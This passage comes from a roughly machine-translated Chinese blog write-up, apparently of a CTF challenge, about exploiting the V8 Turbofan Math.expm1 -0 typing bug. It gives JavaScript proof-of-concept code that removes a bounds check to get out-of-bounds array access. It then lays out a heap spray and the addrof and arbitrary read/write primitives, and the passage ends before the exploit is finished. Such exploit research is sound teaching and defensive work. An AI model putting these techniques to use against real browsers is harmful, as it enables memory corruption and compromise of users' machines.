+<p>对象。is调用以中间表示的SameValue节点开始。在被称为TypedOptimization的传递中，SameValue节点可以被简化为更特殊的节点(请参阅中ReduceSameValue) <span class="exturl" data-url="aHR0cHM6Ly9jcy5jaHJvbWl1bS5vcmcvY2hyb21pdW0vc3JjL3Y4L3NyYy9jb21waWxlci90eXBlZC1vcHRpbWl6YXRpb24uY2M/cmNsPWRkZTI1ODcyZjU4OTUxYmIwMTQ4Y2Y0M2Q2YTUwNGFiMmYyODA0ODUmbD01MDQ=">typed-optimization.cc<i class="fa fa-external-link-alt"></i></span>). 在我们的例子中，因为我们在比较一些东西(数学。expm1 result)使用-0时，TypedOptimization将用专门的ObjectIsMinusZero替换相同的值。展望未来，我们要做破坏的输入通道被简化了 (<span class="exturl" data-url="aHR0cHM6Ly9jcy5jaHJvbWl1bS5vcmcvY2hyb21pdW0vc3JjL3Y4L3NyYy9jb21waWxlci9zaW1wbGlmaWVkLWxvd2VyaW5nLmNjP3JjbD1kZGUyNTg3MmY1ODk1MWJiMDE0OGNmNDNkNmE1MDRhYjJmMjgwNDg1Jmw9MzA3OQ==">simplified-lowering.cc<i class="fa fa-external-link-alt"></i></span>). 这是管道中的第三种(也是最后一种)类型，它传播相同值节点的类型信息，但不传播专门的ObjectIsMinusZero节点的类型信息。需要类型传播来导致不正确的优化，因此希望避免转换为ObjectIsMinusZero: 像上面一样，不希望优化器过早地发现我们正在与-0进行比较。</p>
+<figure class="highlight bash" data-code="54S26ICM77yM6L+Y5pyJ5LiA5Liq6Zqc56KN5L2g6ZyA6KaB5YWL5pyN44CC5L2/55So5py057Sg55qE5pa55rOV77yM5Zu+5Lit5bCG5pyJ5LiA5LiqRmxvYXRFeHBtMeiKgueCueOAguivpeiKgueCuei+k+WHuuS4gOS4qua1rueCueaVsO+8jOiAjOebuOWQjOWAvOeahOiKgueCuemcgOimgeS4gOS4quaMh+mSiOS9nOS4uui+k+WFpe+8jOWboOatpOe8luivkeWZqOWwhuaPkuWFpeS4gOS4qkNoYW5nZUZsb2F0NjRUb1RhZ2dlZOiKgueCuei/m+ihjOi9rOaNouOAguWboOS4uuexu+Wei+S/oeaBr+ivtOi+k+WFpeawuOi/nOS4jeWPr+iDveaYry0w77yM5omA5Lul5a6D5LiN5YyF5ous54m55q6K55qELTDlpITnkIbvvIzmiJHku6znmoQtMOWwhuiiq+aIquaWreS4uuW4uOinhOeahDDjgIIK"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然而，还有一个障碍你需要克服。使用朴素的方法，图中将有一个FloatExpm1节点。该节点输出一个浮点数，而相同值的节点需要一个指针作为输入，因此编译器将插入一个ChangeFloat64ToTagged节点进行转换。因为类型信息说输入永远不可能是-0，所以它不包括特殊的-0处理，我们的-0将被截断为常规的0。</span><br></pre></td></tr></table></figure>
+
+<p>Math.expm1操作将降低到FloatExpm1节点，该节点接受一个浮点数作为输入，并输出一个浮点数，该浮点数将成为SameValue的输入。然而，有两种可能的方法来表示浮点数: 作为“原始”浮点数，或作为标记的值(可以表示浮点数或对象)。FloatExpm1输出一个原始浮点数，但是SameValue接受一个带标记的值(因为它可以接受所有类型的对象)。因此，编译器插入一个ChangeFloat64ToTagged节点，以将原始浮点数转换为带标记的值。因为编译器认为ChangeFloat64ToTagged的输入永远不会是-0，所以它不会生成处理-0的代码。在运行时，来自Math的-0。expm1将被截断为0，破坏我们的努力。听起来像是个大问题…</p>
+<figure class="highlight bash" data-code="5L2G5piv77yM5Lmf5Y+v5Lul5bCG5YW25pS55Li6Q2FsbOiKgueCue+8jOWug+Wwhui/lOWbnuS4gOS4quW4puagh+iusOeahOWAvO+8jOW5tuS4lOS4jeS8muWPkeeUn+i9rOaNouOAggo="><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">但是，也可以将其改为Call节点，它将返回一个带标记的值，并且不会发生转换。</span><br></pre></td></tr></table></figure>
+
+<p>FloatExpm1只接受浮点数，但如果你尝试计算Math.expm1(“0”)(传递一个字符串)，你会得到NaN，而不是某种错误。所以必须有一种方法让它接受非数参数。答案是V8包含了一个内置的Math.expm1实现，能够处理所有输入类型。如果可以强制Turbofan调用内置函数而不是使用FloatExpm1，会得到一个调用节点。不同的是，调用已经返回了一个标记的值，所以不需要ChangeFloat64ToTagged，并且-0不会被截断为0。</p>
+<figure class="highlight bash" data-code="54S25ZCO77yM5Y+v5Lul5ZyoamF2YXNjcmlwdOaVsOe7hOS4reS9v+eUqOmAmuW4uOeahOajgOafpei+ueeVjOa2iOmZpOWSjE9PQiBSV+e7k+aenOOAggo="><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后，可以在javascript数组中使用通常的检查边界消除和OOB RW结果。</span><br></pre></td></tr></table></figure>
+
+<p>这是正在寻找的错误优化。JavaScript数组访问由CheckBounds节点保护，该节点确保索引在数组边界内。如果优化器可以静态地确定索引始终处于范围内，那么它可以消除CheckBounds节点。将索引与对象的结果相联系的图像。is: 由于输入信息是关闭的，可以让分析器认为索引总是在范围内，而它在运行时可能是在范围外。优化器将错误地消除CheckBounds，使能够对JS数组进行OOB访问，可以使用它来构建更强大的开发原语。</p>
+<h4 id="重述bug"><a href="#重述bug" class="headerlink" title="重述bug"></a>重述bug</h4><p>这是bug报告中的PoC:</p>
+<figure class="highlight bash" data-code="ZnVuY3Rpb24gZm9vKCkgewogICAgcmV0dXJuIE9iamVjdC5pcyhNYXRoLmV4cG0xKC0wKSwgLTApOwp9Cgpjb25zb2xlLmxvZyhmb28oKSk7CiVPcHRpbWl6ZUZ1bmN0aW9uT25OZXh0Q2FsbChmb28pOwpjb25zb2xlLmxvZyhmb28oKSk7Cg=="><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">foo</span></span>() &#123;</span><br><span class="line">    <span class="built_in">return</span> Object.is(Math.expm1(-0), -0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">console.log(foo());</span><br><span class="line">%OptimizeFunctionOnNextCall(foo);</span><br><span class="line">console.log(foo());</span><br></pre></td></tr></table></figure>
+
+<p>这必须与d8 –allow-native-syntax 一起运行。第一次打印将输出true: 代码被解释并执行正确的操作。然后，优化foo并将输出更改为false: 优化器使用了错误的输入信息和折叠对象。是进了一个不变的假。</p>
+<p>问题是，当在挑战的d8中尝试这个PoC时，它不起作用: 第二个打印仍然是正确的。可以使用turbolizer(v8&#x2F;tools&#x2F;turbolizer)来可视化Turbofan在每个优化阶段的IR，并找出发生了什么。通过传递-trace-turbo到d8，它将产生跟踪文件，可以导入Turbolizer。选择’simplified lowering’阶段(这是感兴趣的最后一个阶段)，单击T来显示类型，然后单击四个展开箭头来显示所有节点，然后单击圆形箭头来布局它们。</p>
+<ul>
+<li><img loading="lazy" decoding="async" src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/math-expm1-v8.png"></li>
+</ul>
+<p>从图的这一部分中, 看到了所期望的: 一个FloatExpm1节点，它进入numberisminus 0，然后返回(转换为tagged后)。FloatExpm1的类型为Number，其中包括-0。不应该是PlainNumber或者NaN吗? 发生什么事情了? 原因可以在revert-bugfix-880207.patch文件中找到。重新引入错误。只打补丁typer.cc,不是operation-typer.cc: 因此，这个bug只在调用内置函数时出现，而不是在FloatExpm1上。反正也得生成call，现在就开始吧。</p>
+<p>FloatExpm1是一个针对数字输入的优化节点: 编译器推测输入将是一个数字。如果它在运行时确实是一个数字，很好，它将继续执行优化的代码。如果它不是一个数字，优化后的函数将退出解释器: 这个过程称为反优化。解释器将使用内置，它可以接受所有类型。下一次编译函数时，Turbofan会得到反馈信息，通知它输入并不总是一个数字，并且会产生一个对内置函数的调用，而不是FloatExpm1。</p>
+<p>我们来做一下。将使用循环来触发编译，而不是本地语法，因为在实际运行漏洞时不会使用它。</p>
+<figure class="highlight bash" data-code="ZnVuY3Rpb24gZm9vKHgpIHsKICAgIHJldHVybiBPYmplY3QuaXMoTWF0aC5leHBtMSh4KSwgLTApOwp9Cgpmb28oMCk7CmZvcihsZXQgaSA9IDA7IGkgPCAxMDAwMDA7IGkrKykKICAgIGZvbygiMCIpOwpjb25zb2xlLmxvZyhmb28oLTApKTsK"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> foo(x) &#123;</span><br><span class="line">    <span class="built_in">return</span> Object.is(Math.expm1(x), -0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo(0);</span><br><span class="line"><span class="keyword">for</span>(<span class="built_in">let</span> i = 0; i &lt; 100000; i++)</span><br><span class="line">    foo(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">console.log(foo(-0));</span><br></pre></td></tr></table></figure>
+
+<p>这将打印为false。在运行它时，您将注意到函数现在编译了两次。可以添加–trace-deopt标志来通知取消优化。首先，foo将被解释。一段时间后，假设x是一个数字，就会对它进行编译和乐观优化。第一次调用编译后的函数(x作为字符串)时，得到了反优化:</p>
+<figure class="highlight bash" data-code="Wy4uLl0KOzs7IOWPjeS8mOWMluWcqCA8cG9jMi5qczoyOjI3Piwg5LiN5piv5pWw5a2X77yM5Lmf5LiN5pivT2RkYmFsbApbLi4uXQrku47lj43kvJjljJbmm7TmlrDlj43ppojlnKggPHBvYzIuanM6MjoyNz4sIOS4jeaYr+aVsOWtl++8jOS5n+S4jeaYr09kZGJhbGwK"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[...]</span><br><span class="line">;;; 反优化在 &lt;poc2.js:2:27&gt;, 不是数字，也不是Oddball</span><br><span class="line">[...]</span><br><span class="line">从反优化更新反馈在 &lt;poc2.js:2:27&gt;, 不是数字，也不是Oddball</span><br></pre></td></tr></table></figure>
+
+<p>它在更新类型反馈，告诉Turbofan不要把x当成一个数字。第二次编译函数时，Turbofan会生成一个对内置函数的调用。会看到现在有两个Turbolizer痕迹。最近显示的是一个类型为PlainNumber或NaN的呼叫节点，正如所期望的那样。</p>
+<p>一开始你可能会问foo(0)的目的是什么。老实说，还没有完全搞清楚: 有人可能认为它需要提供数字反馈，但可以在console.log之后移动它，它仍然可以工作(Turbofan在这种情况下默认是乐观的)。然而，如果删除它，它将不再工作。相信这和主体中foo的一些内联有关，但是肯定想知道更多关于这方面的信息。有什么主意就告诉给我!</p>
+<p>复制这个错误。下一步: 在JS数组上获得OOB。</p>
+<h4 id="触发OOB访问"><a href="#触发OOB访问" class="headerlink" title="触发OOB访问"></a>触发OOB访问</h4><p>如前所述，其思想是使数组的索引依赖于对象的结果。这样分析器就会假定索引总是在范围内。例如，考虑foo:</p>
+<figure class="highlight bash" data-code="ZnVuY3Rpb24gZm9vKHgpIHsKICAgIGxldCBhID0gWzAuMSwgMC4yLCAwLjMsIDAuNF07CiAgICBsZXQgYiA9IE9iamVjdC5pcyhNYXRoLmV4cG0xKHgpLCAtMCk7CiAgICByZXR1cm4gYVtiICogMTMzN107Cn0K"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> foo(x) &#123;</span><br><span class="line">    <span class="built_in">let</span> a = [0.1, 0.2, 0.3, 0.4];</span><br><span class="line">    <span class="built_in">let</span> b = Object.is(Math.expm1(x), -0);</span><br><span class="line">    <span class="built_in">return</span> a[b * 1337];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>正在尝试读取OOB，因为很容易看到它。通过使用赋值，它可以轻松地成为一个写入OOB。如果b为false，则访问索引0: 因为a的长度是已知的，所以优化器可以确定这是静态的。如果b为真，访问索引1337，这是越界的。优化器认为b只能是假的，所以它将消除边界检查。我不会在这个例子上浪费时间: 很明显，b将被折叠为一个常量false(就像在PoC中一样)，所以总是访问索引0。</p>
+<p>可以通过将-0作为参数来添加间接变量:</p>
+<figure class="highlight bash" data-code="ZnVuY3Rpb24gZm9vKHgsIHkpIHsKICAgIGxldCBhID0gWzAuMSwgMC4yLCAwLjMsIDAuNF07CiAgICBsZXQgYiA9IE9iamVjdC5pcyhNYXRoLmV4cG0xKHgpLCB5KTsKICAgIHJldHVybiBhW2IgKiAxMzM3XTsKfQovLyDmm7TmlrAgZm9vKC4uLikg5YiwIGZvbyguLi4sIC0wKQo="><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> foo(x, y) &#123;</span><br><span class="line">    <span class="built_in">let</span> a = [0.1, 0.2, 0.3, 0.4];</span><br><span class="line">    <span class="built_in">let</span> b = Object.is(Math.expm1(x), y);</span><br><span class="line">    <span class="built_in">return</span> a[b * 1337];</span><br><span class="line">&#125;</span><br><span class="line">// 更新 foo(...) 到 foo(..., -0)</span><br></pre></td></tr></table></figure>
+
+<p>这次得到了undefined:</p>
+<figure class="highlight bash" data-code="Ozs7IOWPjeS8mOWMluWcqCA8cG9jMy5qczo0OjEzPiwg55WM5aSWCg=="><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;;; 反优化在 &lt;poc3.js:4:13&gt;, 界外</span><br></pre></td></tr></table></figure>
+
+<p>不是折叠了，但也不会去掉边界检查。检查一下Turbolizer(简化降低).</p>
+<ul>
+<li><img loading="lazy" decoding="async" src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/math-expm1-v81.png"></li>
+</ul>
+<p>保留了一个SameValue节点，但它的类型是布尔型而不是单例false型。这意味着分析者认为它可能是真的也可能是假的。这会传播，为索引提供一个范围(0,1337)，这显然不允许边界检查消除。往回看，发现y作为[2]节点的形参，具有NotInternal类型。这意味着分析器不知道y的类型，确切地说，它不知道它总是-0。</p>
+<p>在这一点上，决定有条不紊。学习一下Turbofan管道(见pipeline.cc)并发现:</p>
+<ul>
+<li><p>最后阶段Object.is为false可能发生: 在此之前，不想让分析器知道正在与-0进行比较。</p>
+</li>
+<li><p>类型发生的最后一个阶段: 希望分析器知道在此之前与-0进行比较，以便信息传播。</p>
+</li>
+</ul>
+<p>最后一轮输入是在简化的降低阶段。这是到那时为止的Turbofan优化管道:</p>
+<ul>
+<li><img loading="lazy" decoding="async" src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/math-expm1-v82.png"></li>
+</ul>
+<p>每个阶段都有很多传递，在右边报告了一些相关的，标记了输入传递发生的地方。</p>
+<p>看看折叠是如何发生的。ConstantFoldingReducer将传播-0常量(例如，如果使用的变量的常量值为-0)。正如之前观察到的，TypedOptimization将把与常量-0比较的相同值节点减少为ObjectIsMinusZero节点。稍后在管道中，simpledlowering传递可以在ObjectIsMinusZero节点上执行进一步的缩减 (<span class="exturl" data-url="aHR0cHM6Ly9jcy5jaHJvbWl1bS5vcmcvY2hyb21pdW0vc3JjL3Y4L3NyYy9jb21waWxlci9zaW1wbGlmaWVkLWxvd2VyaW5nLmNjP3JjbD1kZGUyNTg3MmY1ODk1MWJiMDE0OGNmNDNkNmE1MDRhYjJmMjgwNDg1Jmw9MzA3OQ==">simplified-lowering.cc<i class="fa fa-external-link-alt"></i></span>). 由于math.expm1静态类型不包括-0, simplefedlowering会将ObjectIsMinusZero节点折叠成一个假常量。因此，在输入UpdateFeedbackType时，它将从SameValue节点传播类型信息，但不会进一步减少它们。保持相同的值意味着，直到最后一次类型优化之后，分析器才会知道正在与-0进行比较。</p>
+<p>这留下了两个选择。要么在转义分析期间获得信息，要么在类型运行之前进行简化的降低过程中获得信息。简化的降低还为值选择机器表示，并在输入之前反向传播表示反馈。这就是在行动中搞砸的地方。虽然很熟悉V8的代码库，但要弄清楚这篇文章中列出的所有内部结构很累。在查看管道时，大脑跳过了escape分析(可能是因为它被包裹在一个条件中)，认为必须使用简化的降低。剧透警告: 你不会有任何进展的。教训: 通过橡皮鸭重新运行你的系统方法。</p>
+<p>快速复习一下逃逸分析。这段代码:</p>
+<figure class="highlight bash" data-code="ZnVuY3Rpb24gZigpIHsKICAgIGxldCBvID0ge2E6IDV9OwogICAgcmV0dXJuIG8uYTsKfQo="><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">f</span></span>() &#123;</span><br><span class="line">    <span class="built_in">let</span> o = &#123;a: 5&#125;;</span><br><span class="line">    <span class="built_in">return</span> o.a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>显然，它可以重写为:</p>
+<figure class="highlight bash" data-code="ZnVuY3Rpb24gZigpIHsKICAgIGxldCBvX2EgPSA1OwogICAgcmV0dXJuIG9fYTsKfQo="><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">f</span></span>() &#123;</span><br><span class="line">    <span class="built_in">let</span> o_a = 5;</span><br><span class="line">    <span class="built_in">return</span> o_a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>虽然o必须是一个具体的堆分配，但o_a可以被非物化，并在堆栈或寄存器变量中转换(更有效)，或常量折叠到return语句中。</p>
+<p>现在在中间添加一个对函数g的调用:</p>
+<figure class="highlight bash" data-code="ZnVuY3Rpb24gZigpIHsKICAgIGxldCBvID0ge2E6IDV9OwogICAgZyhvKTsKICAgIHJldHVybiBvLmE7Cn0K"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">f</span></span>() &#123;</span><br><span class="line">    <span class="built_in">let</span> o = &#123;a: 5&#125;;</span><br><span class="line">    g(o);</span><br><span class="line">    <span class="built_in">return</span> o.a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>优化不再有效，因为g可以在全局变量中保存对o的引用。因此，不能在堆栈分配中转换o，因为全局引用的寿命会比堆栈变量长，而堆栈变量只有在f的作用域是活的时才有效。o已经逃离了f的范围: 逃离分析的目标是识别哪些对象逃脱了，这样非逃脱的对象就可以被去物化。</p>
+<p>这意味着，在escape分析运行之前，分析器将o.a视为通过对象引用访问一个字段:它不知道它的类型，因为它不能对o做出假设。这对我们来说是完美的。代码比语言更响亮:</p>
+<figure class="highlight bash" data-code="ZnVuY3Rpb24gZm9vKHgpIHsKICAgIGxldCBhID0gWzAuMSwgMC4yLCAwLjMsIDAuNF07CiAgICBsZXQgbyA9IHttejogLTB9OwogICAgbGV0IGIgPSBPYmplY3QuaXMoTWF0aC5leHBtMSh4KSwgby5teik7CiAgICByZXR1cm4gYVtiICogMTMzN107Cn0K"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> foo(x) &#123;</span><br><span class="line">    <span class="built_in">let</span> a = [0.1, 0.2, 0.3, 0.4];</span><br><span class="line">    <span class="built_in">let</span> o = &#123;mz: -0&#125;;</span><br><span class="line">    <span class="built_in">let</span> b = Object.is(Math.expm1(x), o.mz);</span><br><span class="line">    <span class="built_in">return</span> a[b * 1337];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>现在是Object.is的第二个参数是o中的字段mz。在转义分析之前，分析器不知道它是一个常量-0，所以TypedOptimization将保持一个相同的值节点。escape分析发现，o不会逃脱，并将它去物化并传播常数，所以在简化降低之前，得到一个相同的值，其常数为-0。然后，最后一次输入运行将确定SameValue始终为false，并传播此信息，从而消除边界检查。实际上，如果运行这段代码，它将返回“奇怪的”值，因为它从堆中读取超过数组边界的内存(尝试使用索引)。</p>
+<p>太好了，有机会了! 不过，这仅仅是一个开始: 需要在此基础上构建几个原语。</p>
+<h4 id="JavaScript-利用原语"><a href="#JavaScript-利用原语" class="headerlink" title="JavaScript 利用原语"></a>JavaScript 利用原语</h4><p>JavaScript的利用遵循某些常见的模式。在这个漏洞的基础上，漏洞作者构建了更抽象的原语，这在损坏的内存中提供了更多的自由。</p>
+<p>两个常见的原语是addrof和fakeobj。addrof原语接受一个对象，并给我们该对象的内存地址。这是必需的，因为现代系统采用了ASLR(地址空间布局随机化)，因此内存区域(代码、堆、库、堆栈……)的位置是随机的，攻击者是不知道的。此外，JS引擎的堆非常拥挤，因此预测对象的地址是脆弱的。fakeobj原语获取一个内存地址，并返回由该内存支持的对象引用。通过获取由攻击者控制的缓冲区支持的引用，它可以用来制作假JavaScript对象。</p>
+<ul>
+<li><img loading="lazy" decoding="async" src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/math-expm1-v83.png"></li>
+</ul>
+<p>当bug是OOB时，通常的设置是有一个double数组A，可以在其上执行OOB访问，并在内存中放置一个具有内联属性(或对象数组)B的对象A之后。假设攻击者知道两者之间的偏移量(可以在运行时找到)，因此A上的OOB可以用来访问B的内存。诀窍在于，通过内存的访问是双精度访问(假设元素是不打包的快速双精度访问)，而B包含指向对象的指针。为了实现addrof，将对象赋值给B的属性: 这将把对象的地址存储在B的内存单元中。然后，使用A上的OOB将该内存单元读为double，并将其解码为整数(它们的内存表示不同)。fakeobj原语是对称的。将对象的地址编码为double，然后使用a上的OOB将其存储到B的内存中: 现在B的属性包含了对假对象的引用，可以返回它。</p>
+<p>最强大的原语是任意读&#x2F;写，它允许在任何内存地址读或写数据。它通常是通过 <span class="exturl" data-url="aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvZW4tVVMvZG9jcy9XZWIvSmF2YVNjcmlwdC9SZWZlcmVuY2UvR2xvYmFsX09iamVjdHMvQXJyYXlCdWZmZXI=">ArrayBuffer<i class="fa fa-external-link-alt"></i></span>. 在内部，后备缓冲区是行外存储的，ArrayBuffer对象包括一个指向它的指针和它的大小。因此，攻击者控制的ArrayBuffer可以指向内存中的任何地方。这对于普通数组也是可能的，但是ArrayBuffer还有另一个优点: 它可以覆盖<span class="exturl" data-url="aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvZW4tVVMvZG9jcy9XZWIvSmF2YVNjcmlwdC9SZWZlcmVuY2UvR2xvYmFsX09iamVjdHMvVHlwZWRBcnJheQ==">typed arrays<i class="fa fa-external-link-alt"></i></span> 和 <span class="exturl" data-url="aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvZW4tVVMvZG9jcy9XZWIvSmF2YVNjcmlwdC9SZWZlcmVuY2UvR2xvYmFsX09iamVjdHMvRGF0YVZpZXc=">DataView<i class="fa fa-external-link-alt"></i></span> 可以很容易地操作原始内存。ArrayBuffer可以通过两种方式构建: 使用一些其他的原语(例如，稳定OOB)来破坏现有ArrayBuffer的指针和大小，或者通过fakeobj原语来构建一个伪ArrayBuffer。</p>
+<p>回到bug。理想情况下，为了正确地封装OOB，需要一个接受数组、索引并执行OOB(读或写)的函数。取任何索引都很简单，只需要让输入者相信你在用一个数字乘以b(例如，按位和用数字)。MAX_SAFE_INTEGER乘法之前)。然而，发现扩展到任何数组都是非常脆弱的。如果有一种方法可以让它工作，不会感到惊讶，但发现很难保持输入信息的完整性，并让优化器消除边界检查，这也是因为在优化流程中已经很晚了。相反，决定接受这个OOB转瞬即逝的特性，并且只使用它一次来构建一个更可靠和可重复的OOB。</p>
+<p>想法是这样梳理堆将在应用错误的数组后分配三个对象(将其称为origin数组):</p>
+<ul>
+<li>一个快速双精度数组，称之为OOB数组;</li>
+<li>具有内联属性的对象，受害者对象;</li>
+<li>ArrayBuffer，受害者缓冲区.</li>
+</ul>
+<p>将保留对这三个对象的全局引用，以备以后使用。两个受害者的顺序不重要，只要他们在OOB数组之后。使用这种布局，可以使用原始数组OOB将OOB数组的长度破坏为一个较大的值。现在OOB数组通过普通的元素访问为我们提供了可重复的OOB。然后，可以使用面向对象的方法实现受害者对象的addrof原语，使用面向对象的方法实现受害者缓冲区的任意读&#x2F;写。不需要fakeobj。</p>
+<h4 id="构建原语"><a href="#构建原语" class="headerlink" title="构建原语"></a>构建原语</h4><p>这就是我们所追求的堆布局:</p>
+<ul>
+<li><img loading="lazy" decoding="async" src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/math-expm1-v84.png"></li>
+</ul>
+<p>每个JavaScript数组是由两个堆对象: JSArray, 代表实际的JavaScript数组对象, 和一个FixedArray内部固定大小的数组类型用作后备存储器数组元素(这适用于数组没有或很少有洞,否则,就会降级为一个字典对象)。两者都有长度字段。对于JSArray，它是实际的JavaScript长度(在数组访问期间检查)。对于FixedArray，它是后备存储的长度，可以大于JavaScript数组的大小(在过度分配的情况下)。JSArray和FixedArray的顺序可能不同，但动态地找到它们，因此这无关紧要。</p>
+<p>V8的堆是由一个bump分配器和一个分代垃圾收集器管理的(简单介绍, 例如,<span class="exturl" data-url="aHR0cHM6Ly92OC5kZXYvYmxvZy9vcmlub2NvLXBhcmFsbGVsLXNjYXZlbmdlcg==">here<i class="fa fa-external-link-alt"></i></span>). 作为一个bump分配器，对象在内存中的顺序遵循分配的顺序，只要GC不移动太多的东西，所以它应该只是按照顺序分配对象。为了提高可靠性，将在堆上喷洒大量对象，并保持对这些对象的引用，以防止GC收集它们。这应该有助于线性化堆。</p>
+<p>事实上，这种spray也是利用bug的一种副作用。必须在原点数组之后分配OOB数组和受害者，但在访问原点数组之前破坏OOB数组的长度。因此，分配必须是欺骗类型的函数的一部分(前面例子中的foo)。这将在循环中被多次调用，以强制JIT编译，因此将得到大量的分配。尝试使用一个标志来只分配在最后一次调用(-0)，但这搞砸了优化，无论如何想要一个spray。</p>
+<p>这是我们的原语的完整计划:</p>
+<ul>
+<li><img loading="lazy" decoding="async" src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/math-expm1-v85.png"></li>
+</ul>
+<p>使用输入错误通过原始OOB破坏了OOB数组的长度。在那之后，就可以自由了: OOB数组现在可以让我们在任何需要的时候对其他对象进行OOB访问。这种构造只利用了一次bug，这是可取的，因为围绕它编写代码并不容易。OOB数组将是唯一长度为2的数组，它允许通过使用原始OOB在内存中扫描值2来动态地找到它的位置。这比使用固定偏移量更可靠，并且可以容忍堆布局的一些变化。注意，长度2在JSArray和FixedArray中都存在，但感兴趣的是查找和破坏JSArray的长度。OOB数组(0.4和0.5)的元素将作为标记来区分JSArray和支持的FixedArray。</p>
+<p>一旦OOB数组被损坏，通过OOB对受害者对象构建addrof，并通过OOB对受害者缓冲区进行任意读&#x2F;写，方法是更改其指向所需地址的反向指针。对象中有标记: 在受害者对象中有一个值为0x41414141的内联属性，在受害者缓冲区中有一个大小为0x41的属性。通过这种方式，可以通过从OOB数组读取这些标记来扫描内存来定位它们。</p>
+<p>实现这个。将使用三个全局数组(arrs、obs和bufs)来存储喷洒的实例。为了处理64位整数，将使用实用程序<span class="exturl" data-url="aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vc2FlbG8vNTI5ODVmZTQxNWNhNTc2Yzk0ZmMzZjE5NzVkYmU4Mzc=">this exploit<i class="fa fa-external-link-alt"></i></span> by Samuel Groß.</p>
+<p>函数照常启动，通过触发输入错误:</p>
+<figure class="highlight bash" data-code="bGV0IG8gPSB7bXo6IC0wfTsKbGV0IGIgPSBPYmplY3QuaXMoTWF0aC5leHBtMSh4KSwgby5teik7Cg=="><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">let</span> o = &#123;mz: -0&#125;;</span><br><span class="line"><span class="built_in">let</span> b = Object.is(Math.expm1(x), o.mz);</span><br></pre></td></tr></table></figure>
+
+<p>然后分配对象，并将它们保存到全局数组中:</p>
+<figure class="highlight bash" data-code="bGV0IGEgPSBbMC4xLCAwLjIsIDAuMywgMC40XTsgLy8gb3JpZ2luIGFycmF5CmFycnMucHVzaChbMC40LCAwLjVdKTsgLy8gT09CIGFycmF5Cm9ianMucHVzaCh7bWFya2VyOiAweDQxNDE0MTQxLCBvYmo6IHt9fSk7IC8vIHZpY3RpbSBvYmplY3QKYnVmcy5wdXNoKG5ldyBBcnJheUJ1ZmZlcigweDQxKSk7IC8vIHZpY3RpbSBidWZmZXIK"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">let</span> a = [0.1, 0.2, 0.3, 0.4]; // origin array</span><br><span class="line">arrs.push([0.4, 0.5]); // OOB array</span><br><span class="line">objs.push(&#123;marker: 0x41414141, obj: &#123;&#125;&#125;); // victim object</span><br><span class="line">bufs.push(new ArrayBuffer(0x41)); // victim buffer</span><br></pre></td></tr></table></figure>
+
+<p>现在可以搜索OOB数组，破坏JSArray的长度，这样就完成了:</p>
